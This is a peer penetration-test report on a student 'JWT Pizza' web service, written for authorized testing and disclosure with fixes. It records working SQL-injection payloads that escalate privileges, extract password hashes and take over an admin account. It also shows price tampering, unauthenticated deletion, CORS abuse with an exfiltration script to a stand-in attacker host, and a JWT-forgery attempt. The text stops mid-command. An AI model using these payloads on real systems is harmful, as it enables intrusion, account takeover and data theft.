# Peer Attack Records — Marco Sotomarino's JWT Pizza

**Tester:** Jay Ellis
**Date:** April 13, 2026
**Target:** pizza-service.marcosotomarino.com / pizza.marcosotomarino.com

---

## Attack 1 — SQL Injection via User Update (Privilege Escalation)

| Item           | Result                                                     |
| -------------- | ---------------------------------------------------------- |
| Date           | April 13, 2026                                             |
| Target         | pizza-service.marcosotomarino.com                          |
| Classification | A03 Injection                                              |
| Severity       | 4                                                          |
| Description    | The `PUT /api/user/:userId` endpoint uses string           |
|                | concatenation to build SQL UPDATE statements. By injecting |
|                | `admin'-- ` in the `name` field, the WHERE clause is       |
|                | commented out, causing the UPDATE to modify user ID 1      |
|                | instead of the authenticated user (ID 17). The server      |
|                | returned a JWT for user ID 1, proving privilege escalation |
|                | from a regular diner account to another user's identity.   |
|                | Error-based injection also revealed the full SQL query     |
|                | structure, table names, column names, and internal file    |
|                | paths through stack traces.                                |
| Images         | See below                                                  |
| Corrections    | Use parameterized queries (`?` placeholders) in            |
|                | `database.js:updateUser()`. Never concatenate user input   |
|                | into SQL strings. Disable stack trace exposure in          |
|                | production error responses.                                |

**Payload — SQL comment injection in name field:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/17" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"test@test.com","name":"admin'\''-- "}'
```

**Response (JWT for user ID 1 returned — privilege escalation):**

```json
{
  "user": {
    "id": 1,
    "name": "admin",
    "email": "test@test.com",
    "roles": [{ "role": "diner" }]
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJkaW5lciJ9XSwiaWF0IjoxNzc2MDY5NzI0fQ.f7wFJv46gud3_QIrGDTU4sUqQH1gA6_7iDHl2R8Tz60"
}
```

> Authenticated as user ID 17 (pentest2, diner) but received a JWT for user ID 1.
> The SQL comment (`-- `) truncated the WHERE clause, causing the UPDATE to hit
> the first row in the table instead of the targeted user.

**Error-based injection — reveals SQL structure:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/17" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"x'\'' UNION SELECT id,name,email,password FROM user WHERE '\''1'\''='\''1","password":"test"}'
```

**Response (SQL structure leaked):**

```json
{
  "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT id,name,email,password FROM user WHERE '1'='1' WHERE id=17' at line 1",
  "stack": "Error: You have an error in your SQL syntax...\n    at PromiseConnection.execute (/app/node_modules/mysql2/lib/promise/connection.js:47:22)\n    at DB.query (/app/src/database/database.js:475:40)\n    at DB.updateUser (/app/src/database/database.js:143:20)..."
}
```

> Reveals: MySQL database, table name `user`, column names (`id`, `name`, `email`,
> `password`), file paths (`/app/src/database/database.js:475`), and confirms
> unparameterized queries via `PromiseConnection.execute`.

---

## Attack 2 — Unauthenticated Franchise Deletion

| Item           | Result                                                      |
| -------------- | ----------------------------------------------------------- |
| Date           | April 13, 2026                                              |
| Target         | pizza-service.marcosotomarino.com                           |
| Classification | A01 Broken Access Control                                   |
| Severity       | 4                                                           |
| Description    | The `DELETE /api/franchise/:franchiseId` endpoint has no    |
|                | authentication middleware. Sent a DELETE request to         |
|                | franchise ID 3 ("Provo") with absolutely no Authorization   |
|                | header. The server returned 200 OK and deleted the          |
|                | franchise. Any anonymous user on the internet can destroy   |
|                | business data. Notably, `POST /api/franchise` DOES require  |
|                | auth + admin role (403), so only the DELETE is unprotected. |
| Images         | See below                                                   |
| Corrections    | Add `authRouter.authenticateToken` middleware and an admin  |
|                | role check to the DELETE `/api/franchise/:franchiseId`      |
|                | route in `franchiseRouter.js`.                              |

**Franchises before attack:**

```json
{
  "franchises": [
    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
    { "id": 3, "name": "Provo", "stores": [] },
    { "id": 2, "name": "SLC", "stores": [] }
  ],
  "more": false
}
```

**Attack — DELETE with NO authentication:**

```bash
curl -s -X DELETE https://pizza-service.marcosotomarino.com/api/franchise/3 \
  -w "\nHTTP_CODE: %{http_code}"
```

**Response:**

```
{"message":"franchise deleted"}
HTTP_CODE: 200
```

**Franchises after attack:**

```json
{
  "franchises": [
    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
    { "id": 2, "name": "SLC", "stores": [] }
  ],
  "more": false
}
```

> Franchise "Provo" (ID 3) is gone. No login, no token, no credentials required.

---

## Attack 3 — Order Pizza for $0 and Negative Prices

| Item           | Result                                                      |
| -------------- | ----------------------------------------------------------- |
| Date           | April 13, 2026                                              |
| Target         | pizza-service.marcosotomarino.com                           |
| Classification | A04 Insecure Design                                         |
| Severity       | 3                                                           |
| Description    | The server accepts order prices directly from the client    |
|                | without validating against the menu database. Submitted an  |
|                | order for a Veggie pizza at price 0.0001 (real price:       |
|                | 0.0038) and the order was accepted. The pizza factory       |
|                | issued a valid verification JWT. Also tested with a         |
|                | negative price of -100, which was also accepted. In a real  |
|                | system, negative prices could credit money to the attacker. |
| Images         | See below                                                   |
| Corrections    | Server-side price validation: look up the actual price from |
|                | the `menu` table using the `menuId` and ignore the          |
|                | client-supplied `price` field. Reject negative and zero     |
|                | prices.                                                     |

**Menu shows real prices:**

```json
[
  { "id": 2, "title": "Veggie", "price": 0.0038 },
  { "id": 3, "title": "Margarita", "price": 0.0014 },
  { "id": 4, "title": "Crusty", "price": 0.0024 },
  { "id": 5, "title": "Charred Leopard", "price": 0.005 },
  { "id": 6, "title": "Pepperoni", "price": 0.0042 }
]
```

**Attack 3a — Near-zero price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":0.0001}]}'
```

**Response (order accepted at fraudulent price):**

```json
{
  "order": {
    "franchiseId": 1,
    "storeId": 1,
    "items": [{ "menuId": 2, "description": "Veggie", "price": 0.0001 }],
    "id": 438
  },
  "jwt": "eyJpYXQiOjE3NzYwNjk3NDAsImV4cCI6MTc3NjE1NjE0MCwiaXNzIjoiY3MzMjkuY2xpY2siLCJhbGciOiJSUzI1NiIsImtpZCI6Ik9TcF94VzhlM3kwNk1KS3ZIeW9sRFZMaXZXX2hnTWxhcFZSUVFQVndiY0UifQ..."
}
```

**Attack 3b — Negative price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":-100}]}'
```

**Response (negative price accepted):**

```json
{
  "order": {
    "franchiseId": 1,
    "storeId": 1,
    "items": [{ "menuId": 2, "description": "Veggie", "price": -100 }],
    "id": 439
  },
  "jwt": "eyJpYXQiOjE3NzYwNzAyMTgsImV4cCI6MTc3NjE1NjYxOCwiaXNzIjoiY3MzMjkuY2xpY2siLCJhbGciOiJSUzI1NiIsImtpZCI6Ik9TcF94VzhlM3kwNk1KS3ZIeW9sRFZMaXZXX2hnTWxhcFZSUVFQVndiY0UifQ..."
}
```

> Both orders were fully processed and the pizza factory issued valid signed JWTs
> for each. An attacker can order unlimited free pizza or even generate credits
> with negative prices.

---

## Attack 4 — Information Disclosure & Security Misconfiguration

| Item           | Result                                                      |
| -------------- | ----------------------------------------------------------- |
| Date           | April 13, 2026                                              |
| Target         | pizza-service.marcosotomarino.com                           |
| Classification | A05 Security Misconfiguration                               |
| Severity       | 2                                                           |
| Description    | Multiple misconfiguration issues leak internal architecture |
|                | details. The `/api/docs` endpoint publicly exposes the AWS  |
|                | RDS database hostname. All error responses include full     |
|                | Node.js stack traces revealing file paths, module versions, |
|                | and application structure. The server exposes               |
|                | `X-Powered-By: Express` and is missing all standard         |
|                | security headers (CSP, HSTS, X-Frame-Options). CORS is      |
|                | configured to reflect any origin with `credentials: true`,  |
|                | allowing cross-origin credential theft from any website.    |
| Images         | See below                                                   |
| Corrections    | 1) Remove DB hostname from `/api/docs`. 2) Set              |
|                | `NODE_ENV=production` and strip `stack` from error          |
|                | responses. 3) Remove `X-Powered-By` header. 4) Add CSP,     |
|                | HSTS, X-Frame-Options headers. 5) Configure CORS to         |
|                | allow only the production frontend origin.                  |

**4a. Database hostname leaked in /api/docs:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/docs | grep -o '"db":"[^"]*"'
```

```
"db":"jwt-pizza-db.csdC8skiue7b.us-east-1.rds.amazonaws.com"
```

> Reveals AWS RDS instance name, region (us-east-1), and specific identifier.

**4b. Stack trace leaked on malformed JSON:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d 'not json'
```

```json
{
  "message": "Unexpected token 'n', \"not json\" is not valid JSON",
  "stack": "SyntaxError: Unexpected token 'n', \"not json\" is not valid JSON\n    at JSON.parse (<anonymous>)\n    at createStrictSyntaxError (/app/node_modules/body-parser/lib/types/json.js:169:10)\n    at parse (/app/node_modules/body-parser/lib/types/json.js:86:15)\n    at /app/node_modules/body-parser/lib/read.js:128:18\n    at AsyncResource.runInAsyncScope (node:async_hooks:206:9)\n    at invokeCallback (/app/node_modules/raw-body/index.js:238:16)\n    at done (/app/node_modules/raw-body/index.js:227:7)\n    at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:287:7)\n    at IncomingMessage.emit (node:events:524:28)\n    at endReadableNT (node:internal/streams/readable:1698:12)"
}
```

> Reveals: `/app/` container root, Node.js runtime, body-parser and raw-body
> module versions, internal file paths and line numbers.

**4c. Stack trace leaked on auth failure:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"doesnotexist@nowhere.com","password":"anything"}'
```

```json
{
  "message": "unknown user",
  "stack": "Error: unknown user\n    at DB.getUser (/app/src/database/database.js:107:15)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n    at async /app/src/routes/authRouter.js:110:18"
}
```

> Reveals: `/app/src/database/database.js:107`, `/app/src/routes/authRouter.js:110`.

**4d. X-Powered-By and missing security headers:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/
```

```
HTTP/2 200
x-powered-by: Express
access-control-allow-origin: *
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> `X-Powered-By: Express` present. No `Content-Security-Policy`,
> `Strict-Transport-Security`, `X-Frame-Options`, or `X-Content-Type-Options`.

**4e. CORS reflects arbitrary origin:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

```
access-control-allow-origin: https://evil-attacker.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> The attacker's origin is echoed back verbatim with credentials allowed. Any
> malicious website can make authenticated cross-origin requests to the API.

---

## Attack 5 — JWT Forgery Attempt (Default Secret)

| Item           | Result                                                      |
| -------------- | ----------------------------------------------------------- |
| Date           | April 13, 2026                                              |
| Target         | pizza-service.marcosotomarino.com                           |
| Classification | A02 Cryptographic Failures                                  |
| Severity       | 0                                                           |
| Description    | The source code `.env` file contains                        |
|                | `JWT_SECRET=dev-secret-key-change-in-production`. Attempted |
|                | to forge an admin JWT using this default secret and also    |
|                | tried 10 other common secrets (secret, password, changeme,  |
|                | pizza, jwt-secret, etc.). All forged tokens were rejected   |
|                | by the production server, confirming Marco changed the JWT  |
|                | secret for production. However, JWT tokens still have no    |
|                | `exp` claim — tokens never expire, meaning a stolen token   |
|                | is valid forever.                                           |
| Images         | See below                                                   |
| Corrections    | 1) Remove the default secret from `.env` — use              |
|                | environment-variable-only injection. 2) Add `.env` to       |
|                | `.gitignore`. 3) Add JWT expiration (`expiresIn: '1h'`)     |
|                | to `jwt.sign()` calls.                                      |

**Forged admin token with default secret:**

```bash
cd jwt-pizza-service
FORGED=$(node -e "
  const jwt = require('jsonwebtoken');
  const token = jwt.sign(
    {id:17, name:'pentest2', email:'pentest2@test.com', roles:[{role:'admin'}]},
    'dev-secret-key-change-in-production'
  );
  console.log(token);
")
```

**Test forged token:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/order \
  -H "Authorization: Bearer $FORGED"
```

```json
{ "message": "unauthorized" }
```

**Brute force of 10 common secrets — all rejected:**

```
Secret 'secret':      {"message":"unauthorized"}
Secret 'jwt-secret':  {"message":"unauthorized"}
Secret 'pizza':       {"message":"unauthorized"}
Secret 'password':    {"message":"unauthorized"}
Secret 'changeme':    {"message":"unauthorized"}
Secret 'jwtsecret':   {"message":"unauthorized"}
Secret 'pizzasecret': {"message":"unauthorized"}
Secret 'cs329':       {"message":"unauthorized"}
Secret 'jwt_secret':  {"message":"unauthorized"}
Secret 'supersecret': {"message":"unauthorized"}
```

> Marco changed the JWT secret. Forgery is not exploitable. However, tokens still
> lack an `exp` claim — decoded JWT payload shows `iat` only:

```json
{
  "id": 17,
  "name": "pentest2",
  "email": "pentest2@test.com",
  "roles": [{ "role": "diner" }],
  "iat": 1776069642
}
```

> No `exp` field. A stolen token is valid indefinitely.

---

## Attack 6 — CORS Cross-Origin Credential Theft (A05 Security Misconfiguration)

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 13, 2026                                                |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | A05 Security Misconfiguration                                 |
| Severity       | 3                                                             |
| Description    | The API reflects any `Origin` header verbatim in              |
|                | `Access-Control-Allow-Origin` with                            |
|                | `Access-Control-Allow-Credentials: true` on all endpoints.    |
|                | Preflight `OPTIONS` requests also reflect the evil origin     |
|                | and approve all methods (GET, POST, PUT, DELETE). This means  |
|                | a malicious website can make fully authenticated cross-origin |
|                | requests on behalf of any logged-in user. An attacker hosts   |
|                | `evil-attacker.com`, the victim visits it while logged into   |
|                | JWT Pizza, and the attacker's JavaScript reads the victim's   |
|                | orders, profile, and JWT token, or performs actions (place    |
|                | orders, delete franchises) as the victim.                     |
| Images         | See below                                                     |
| Corrections    | Configure CORS to allow only the production frontend origin   |
|                | (`https://pizza.marcosotomarino.com`). Remove the wildcard    |
|                | origin reflection. If multiple origins are needed, maintain   |
|                | an explicit allowlist and check against it.                   |

**6a. Origin reflection on authenticated endpoint:**

```bash
curl -sI "https://pizza-service.marcosotomarino.com/api/order" \
  -H "Origin: https://evil-attacker.com" \
  -H "Authorization: Bearer $TOKEN"
```

```
HTTP/2 200
x-powered-by: Express
access-control-allow-origin: https://evil-attacker.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> The attacker's origin is echoed back with full credential access.

**6b. Reflection on auth endpoint with different origin:**

```bash
curl -sI "https://pizza-service.marcosotomarino.com/api/auth" \
  -H "Origin: https://malicious-site.com"
```

```
HTTP/2 404
access-control-allow-origin: https://malicious-site.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> Even error responses reflect the attacker's origin with credentials.

**6c. Preflight OPTIONS request — evil origin approved:**

```bash
curl -s -X OPTIONS "https://pizza-service.marcosotomarino.com/api/order" \
  -H "Origin: https://evil-attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization" \
  -D - -o /dev/null
```

```
HTTP/2 200
access-control-allow-origin: https://evil-attacker.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> The browser's preflight check passes. The attacker's page can now send
> POST/PUT/DELETE requests with the victim's credentials.

**Exploitation scenario:**

An attacker hosts this on `https://evil-attacker.com`:

```html
<script>
  // Steal victim's order history and JWT token
  fetch('https://pizza-service.marcosotomarino.com/api/order', {
    credentials: 'include',
    headers: { Authorization: 'Bearer ' + stolenToken },
  })
    .then((r) => r.json())
    .then((data) => {
      // Exfiltrate to attacker's server
      fetch('https://evil-attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data),
      });
    });
</script>
```

> Combined with the JWT tokens stored in `localStorage` (accessible via XSS)
> and the lack of token expiry, CORS exploitation enables full account takeover
> from any website the victim visits.

---

## Attack 7 — SQL Injection via LIMIT/OFFSET Parameters (A03 Injection)

| Item           | Result                                                       |
| -------------- | ------------------------------------------------------------ |
| Date           | April 13, 2026                                               |
| Target         | pizza-service.marcosotomarino.com                            |
| Classification | A03 Injection                                                |
| Severity       | 2                                                            |
| Description    | The `page` query parameter on `GET /api/order` and           |
|                | `GET /api/franchise` is interpolated into SQL LIMIT/OFFSET   |
|                | clauses via template literals without validation. Injecting  |
|                | non-numeric values causes "Undeclared variable: NaN" errors  |
|                | with full stack traces. A negative page value (`-1`) causes  |
|                | a SQL syntax error that reveals the LIMIT/OFFSET structure   |
|                | (`near '-20,10'`). While JavaScript's type coercion to NaN   |
|                | prevents direct UNION-based extraction, the error messages   |
|                | leak internal file paths (`database.js:475`, `database.js:   |
|                | 223`, `orderRouter.js:117`, `franchiseRouter.js:83`) and     |
|                | confirm the query pattern. This is a separate injection      |
|                | point from the `PUT /api/user` vulnerability (Attack 1).     |
| Images         | See below                                                    |
| Corrections    | Parse `page` with `parseInt()` and validate it is a positive |
|                | integer before use. Use parameterized queries for LIMIT and  |
|                | OFFSET values. Return generic error messages without stack   |
|                | traces.                                                      |

**7a. SQL injection string in page parameter (orders):**

```bash
curl -s "https://pizza-service.marcosotomarino.com/api/order?page=1%3B%20SELECT%201" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "message": "Undeclared variable: NaN",
  "stack": "Error: Undeclared variable: NaN\n    at PromiseConnection.execute (/app/node_modules/mysql2/lib/promise/connection.js:47:22)\n    at DB.query (/app/src/database/database.js:475:40)\n    at DB.getOrders (/app/src/database/database.js:223:33)\n    at async /app/src/routes/orderRouter.js:117:14"
}
```

> Reveals: `database.js:475` (query function), `database.js:223` (getOrders), `orderRouter.js:117`.

**7b. Negative page — reveals LIMIT/OFFSET structure:**

```bash
curl -s "https://pizza-service.marcosotomarino.com/api/order?page=-1" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-20,10' at line 1",
  "stack": "Error: You have an error in your SQL syntax...at DB.getOrders (/app/src/database/database.js:223:33)..."
}
```

> The `near '-20,10'` confirms the page value is used to compute an offset
> (formula: `(page - 1) * 10 = -20`) and a limit of 10 rows, both interpolated
> directly into the SQL string.

**7c. Same vulnerability on franchise endpoint:**

```bash
curl -s "https://pizza-service.marcosotomarino.com/api/franchise?page=1%3B%20SELECT%201"
```

```json
{
  "message": "Undeclared variable: NaN",
  "stack": "Error: Undeclared variable: NaN\n    at DB.getFranchises (/app/src/database/database.js:340:35)\n    at async /app/src/routes/franchiseRouter.js:83:32"
}
```

> Same vulnerability in a different code path: `database.js:340` (getFranchises),
> `franchiseRouter.js:83`. No authentication required for this endpoint.

---

## Attack 8 — SQL Injection: Full Database Extraction (A03 Injection)

| Item           | Result                                                         |
| -------------- | -------------------------------------------------------------- |
| Date           | April 13, 2026                                                 |
| Target         | pizza-service.marcosotomarino.com                              |
| Classification | A03 Injection                                                  |
| Severity       | 4                                                              |
| Description    | Extending Attack 1's SQL injection in `PUT /api/user/:userId`, |
|                | used a nested subquery technique to bypass MySQL's             |
|                | "can't specify target table for update in FROM clause"         |
|                | restriction. Injected `name='x', name=(SELECT x FROM           |
|                | (SELECT password AS x FROM user WHERE id=N) AS tmp)            |
|                | WHERE id=22-- ` to extract data from any table and return      |
|                | it in the API response. Successfully extracted: (1) the        |
|                | full database schema (8 tables), (2) bcrypt password hashes    |
|                | for all 3 privileged accounts (admin + franchisee),            |
|                | (3) complete user role mapping for all 22 users, and           |
|                | (4) email addresses for all users. With the password hashes,   |
|                | an offline brute-force attack could recover plaintext          |
|                | passwords for the admin accounts.                              |
| Images         | See below                                                      |
| Corrections    | Use parameterized queries (`?` placeholders) in                |
|                | `database.js:updateUser()`. This single fix blocks all SQL     |
|                | injection variants (privilege escalation, data extraction,     |
|                | and error-based disclosure).                                   |

**8a. Extract database schema — all table names:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/22" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT GROUP_CONCAT(table_name SEPARATOR '"'"'|'"'"') FROM information_schema.tables WHERE table_schema=database()) WHERE id=22-- "}'
```

**Response — full schema returned in `name` field:**

```json
{
  "user": {
    "id": 22,
    "name": "auth|dinerOrder|franchise|menu|orderItem|store|user|userRole",
    "email": "pentest3@test.com",
    "roles": [{ "role": "diner" }]
  }
}
```

> **8 tables extracted:** `auth`, `dinerOrder`, `franchise`, `menu`, `orderItem`,
> `store`, `user`, `userRole`. Complete database schema revealed.

**8b. Extract all user roles — identify admin accounts:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/22" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT GROUP_CONCAT(userId,'"'"':'"'"',role SEPARATOR '"'"'|'"'"') FROM userRole) WHERE id=22-- "}'
```

**Response — all role assignments:**

```json
{
  "user": {
    "id": 22,
    "name": "1:diner|2:diner|3:diner|3:admin|2:admin|2:franchisee|2:franchisee|4:diner|5:diner|6:diner|7:diner|8:diner|9:diner|10:diner|11:diner|12:diner|13:diner|14:diner|15:diner|16:diner|17:diner|18:diner|19:diner|20:diner|21:diner|22:diner"
  }
}
```

> **Admin accounts identified:** User 2 (admin + franchisee) and User 3 (admin).
> All other users (1, 4-22) are diners only.

**8c. Extract password hash — user 1:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/22" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=1) AS tmp) WHERE id=22-- "}'
```

**Response:**

```json
{
  "user": {
    "id": 22,
    "name": "$2b$10$myn0NQ5XGs7cgGcbdajW6../AtiA8Wl/ql89aWrNegHSadJw4ACBG"
  }
}
```

**8d. Extract password hash — user 2 (admin):**

```json
{
  "user": {
    "id": 22,
    "name": "$2b$10$.6Ty/Gi07c6Lk0VwMvuehuVerDU5fA1VUQl5dkKhSNPY.c5t2NXm2"
  }
}
```

**8e. Extract password hash — user 3 (admin):**

```json
{
  "user": {
    "id": 22,
    "name": "$2b$10$ojmETXR9f/96GEUurrKUc./sW4iQxlSJCK2/E2nqgrDy0v2WdIc8m"
  }
}
```

> All three privileged accounts' bcrypt hashes extracted. With tools like
> `hashcat` or `john`, an attacker could attempt offline password cracking.
> Combined with Attack 1's privilege escalation, this gives full access to
> every account in the system.

**Technique explanation:**

The key insight is using MySQL's nested subquery workaround and injecting into
the SET clause while **preserving the WHERE clause**:

```sql
-- Injected name value:
x', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=1) AS tmp) WHERE id=22--

-- Resulting SQL:
UPDATE user SET name='x', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=1) AS tmp) WHERE id=22-- ', email='...' WHERE id=17

-- MySQL processes: UPDATE user SET name=(subquery result) WHERE id=22
-- The -- comments out the duplicate email/WHERE portion
-- The nested subquery bypasses "can't specify target table" restriction
```

---

## Attack 9 — Frontend Admin Dashboard Disclosure (A01 Broken Access Control)

| Item           | Result                                                          |
| -------------- | --------------------------------------------------------------- |
| Date           | April 13, 2026                                                  |
| Target         | pizza.marcosotomarino.com                                       |
| Classification | A01 Broken Access Control                                       |
| Severity       | 2                                                               |
| Description    | The frontend is a React SPA served from CloudFront/S3. All      |
|                | routes, including `/admin-dashboard`, serve the same            |
|                | `index.html` with the full JavaScript bundle. Any               |
|                | unauthenticated user can navigate directly to                   |
|                | `https://pizza.marcosotomarino.com/admin-dashboard` and the     |
|                | browser renders the admin UI components, revealing the admin    |
|                | interface structure, API endpoint patterns, franchise/store     |
|                | management schemas, and user management functionality.          |
|                | Additionally, `robots.txt` explicitly lists `/admin-dashboard/` |
|                | and `/docs/` as disallowed, advertising these sensitive paths   |
|                | to attackers. Route protection is client-side only (React       |
|                | nav link visibility), not enforced at the route level.          |
| Images         | See below                                                       |
| Corrections    | 1) Add a React route guard component that checks auth state     |
|                | and admin role before rendering admin routes — redirect         |
|                | unauthorized users. 2) Remove sensitive paths from              |
|                | `robots.txt`. 3) Consider server-side rendering or an auth      |
|                | gateway for admin routes.                                       |

**9a. Admin dashboard accessible without authentication:**

```bash
curl -s "https://pizza.marcosotomarino.com/admin-dashboard" | head -15
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" href="jwt-pizza-icon.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>JWT Pizza</title>
    <script type="module" crossorigin src="/assets/index-CsPcqWP-.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-CHiGweTW.css" />
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
  </body>
</html>
```

> The full SPA bundle (`index-CsPcqWP-.js`) is served to anyone. The React app
> renders the admin dashboard components client-side — an attacker can inspect
> the admin UI, API calls, and data schemas without any authentication.

**9b. robots.txt advertises sensitive paths:**

```bash
curl -s "https://pizza.marcosotomarino.com/robots.txt"
```

```
User-agent: *
Disallow: /admin-dashboard/
Disallow: /docs/
```

> `robots.txt` tells every crawler (and attacker) exactly where the sensitive
> endpoints are. This is a common misconfiguration — disallowing a path in
> robots.txt does not restrict access; it just advertises it.

**9c. Version disclosure:**

```bash
curl -s "https://pizza.marcosotomarino.com/version.json"
```

```json
{ "version": "20000101.000000" }
```

> Frontend version publicly accessible.

---

## Attack 10 — Full Kill Chain: SQLi to Admin Takeover to Franchise Creation (A03 + A01)

| Item           | Result                                                       |
| -------------- | ------------------------------------------------------------ |
| Date           | April 13, 2026                                               |
| Target         | pizza-service.marcosotomarino.com                            |
| Classification | A03 Injection / A01 Broken Access Control                    |
| Severity       | 4                                                            |
| Description    | Demonstrated a complete attack chain from a self-registered  |
|                | diner account to full admin control. Used the SQL injection  |
|                | vulnerability (Attacks 1/8) to: (1) enumerate user roles and |
|                | identify admin accounts (user 2 = admin + franchisee),       |
|                | (2) overwrite the admin's email and password via SQLi by     |
|                | copying pentest3's known password hash onto user 2, and      |
|                | (3) log in as the admin. With the admin JWT, created a new   |
|                | franchise ("Pwned Pizza", ID 4) and added a store ("Hacker   |
|                | HQ", store ID 2) — proving full administrative control over  |
|                | the business. This is a complete privilege escalation from   |
|                | anonymous registration to admin with persistent business     |
|                | impact.                                                      |
| Images         | See below                                                    |
| Corrections    | Fix the root cause: parameterized queries in                 |
|                | `database.js:updateUser()`. Without SQL injection, this      |
|                | entire chain is impossible. Additionally, admin credential   |
|                | changes should require re-authentication or MFA.             |

**Kill chain overview:**

```
Register diner account (pentest3, ID 22)
    │
    ▼
SQLi: Extract userRole table → identify user 2 as admin  (Attack 8b)
    │
    ▼
SQLi: Extract user 2's password hash                      (Attack 8d)
    │
    ▼
SQLi: Overwrite user 2's email + password with known values  (Step 1 below)
    │
    ▼
Login as user 2 → receive admin JWT                        (Step 2 below)
    │
    ▼
Create franchise "Pwned Pizza" + store "Hacker HQ"         (Step 3 below)
```

**Step 1 — Overwrite admin credentials via SQLi:**

The injection copies pentest3's password hash (which corresponds to the known
password `pentest123`) onto user 2, and sets user 2's email to a value we
control:

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/22" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', email='"'"'admin-pwned@test.com'"'"', password=(SELECT x FROM (SELECT password AS x FROM user WHERE id=22) AS tmp) WHERE id=2-- "}'
```

Resulting SQL:

```sql
UPDATE user SET name='x', email='admin-pwned@test.com',
  password=(SELECT x FROM (SELECT password AS x FROM user WHERE id=22) AS tmp)
  WHERE id=2-- ', email='pentest3@test.com' WHERE id=22
```

**Response (user 22 returned — the injection targeted user 2 silently):**

```json
{
  "user": {
    "id": 22,
    "name": "pentest3",
    "email": "pentest3@test.com",
    "roles": [{ "role": "diner" }]
  }
}
```

> User 2's email is now `admin-pwned@test.com` and password hash matches
> `pentest123`. The response shows user 22 (our account) because the endpoint
> returns the authenticated user — the admin credential overwrite happened in
> the database silently.

**Step 2 — Login as admin:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin-pwned@test.com","password":"pentest123"}'
```

**Response (full admin JWT):**

```json
{
  "user": {
    "id": 2,
    "name": "x",
    "email": "admin-pwned@test.com",
    "roles": [
      { "role": "diner" },
      { "role": "admin" },
      { "objectId": 1, "role": "franchisee" },
      { "objectId": 2, "role": "franchisee" }
    ]
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

> Logged in as user 2 with **admin**, **diner**, and **franchisee** roles.
> Full administrative access to the system.

**Step 3a — Create franchise as admin:**

```bash
curl -s -X POST "https://pizza-service.marcosotomarino.com/api/franchise" \
